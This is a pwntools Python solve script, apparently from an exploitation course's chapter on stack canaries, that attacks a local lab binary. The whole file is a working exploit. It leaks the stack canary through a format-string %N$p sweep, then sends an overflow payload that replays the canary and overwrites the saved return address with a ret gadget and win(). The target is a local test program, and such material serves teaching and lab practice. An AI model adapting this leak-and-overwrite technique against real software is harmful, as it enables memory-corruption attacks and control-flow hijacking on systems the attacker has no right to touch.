#!/usr/bin/env python3
"""ch11-canary/canary/solve.py -- leak the per-thread canary from the same
frame via a format-string oracle, then send a linear overflow that reproduces
the canary verbatim and redirects the saved return address to win().

The chapter frames this as ret2libc; on the CI target we ret to a local win()
that writes the ``pwn.marker`` file the Makefile's test target greps for. The
mechanics (leak canary -> replay canary -> overwrite ret) are identical.

Robust locator: send a known 8-byte MARKER prefix in the format string, then
sweep %N$p. Find the N at which vals[N] == MARKER (that is buf[0..7]); the
canary sits (BUF_LEN + PAD)/8 quads later.
"""
import os
import sys
from pwn import ELF, ROP, context, log, p64, process

HERE = os.path.dirname(os.path.abspath(__file__))
BIN  = os.path.join(HERE, "leak")

# Struct layout in leak.c: char buf[128] + long pad = 136.
BUF_LEN = 128
PAD_LEN = 8
OFFSET  = BUF_LEN + PAD_LEN                # buf[0] -> canary = 136

# quads from buf[0] to the canary slot
QUADS_TO_CANARY = OFFSET // 8

MARKER = b"MARKMARK"
MARKER_INT = int.from_bytes(MARKER, "little")

context.log_level = "warning"


def find_canary(io):
    """Send a known marker + %N$p sweep and locate the canary by offset."""
    # Build a compact sweep that fits in 127 chars: MARKER(8) + '|' + up to
    # ~19 %N$p tokens; enough headroom either way.
    tokens = [f"%{i}$p" for i in range(6, 26)]   # N=6..25 (stack region)
    fmt = MARKER + b"|" + b"|".join(t.encode() for t in tokens) + b"\n"
    assert len(fmt) < 128, "format too long for the 128-byte fgets"

    io.send(fmt)
    line = io.recvline().strip()
    io.recvuntil(b"---LEAK-DONE---\n")

    if not line.startswith(MARKER):
        return None

    parts = line[len(MARKER) + 1:].split(b"|")
    vals = []
    for p in parts:
        try:
            vals.append(int(p, 16))
        except (ValueError, TypeError):
            vals.append(None)

    # Locate MARKER in the leaked stack quads: this is buf[0..7], and its
    # printf-varargs index tells us where the frame sits.
    n_mark = None
    for i, v in enumerate(vals):
        if v == MARKER_INT:
            n_mark = i
            break
    if n_mark is None:
        # fall back: pick the value with low-byte 0 and high entropy
        for v in vals:
            if v and (v & 0xff) == 0 and v > (1 << 40):
                return v
        return None

    n_canary = n_mark + QUADS_TO_CANARY
    if n_canary >= len(vals) or vals[n_canary] is None:
        return None
    return vals[n_canary]


def main() -> int:
    marker = os.path.join(HERE, "pwn.marker")
    try:
        os.remove(marker)
    except FileNotFoundError:
        pass

    elf = ELF(BIN, checksec=False)
    context.binary = elf

    io = process([BIN], cwd=HERE)
    canary = find_canary(io)
    if canary is None:
        log.failure("no canary-shaped leak found in %p sweep")
        io.close()
        return 2
    log.info(f"canary = {canary:#018x}")
    if (canary & 0xff) != 0:
        log.warning(f"low byte is {canary & 0xff:#04x}, not 0 -- misidentified?")

    rop = ROP(elf)
    ret_gadget = rop.find_gadget(["ret"])[0]

    payload  = b"A" * OFFSET
    payload += p64(canary)                  # replay canary verbatim
    payload += b"B" * 8                     # saved rbp (unused)
    payload += p64(ret_gadget)              # 16-byte stack alignment for win()
    payload += p64(elf.sym["win"])
    payload  = payload.ljust(400, b"C")     # let read() consume without waiting

    io.send(payload)
    try:
        io.recvall(timeout=3)
    except Exception:
        pass
    io.close()

    if os.path.exists(marker):
        print("CANARY-LEAK-OK")
        return 0
    print("CANARY-LEAK-FAIL: marker not written")
    return 1


if __name__ == "__main__":
    sys.exit(main())
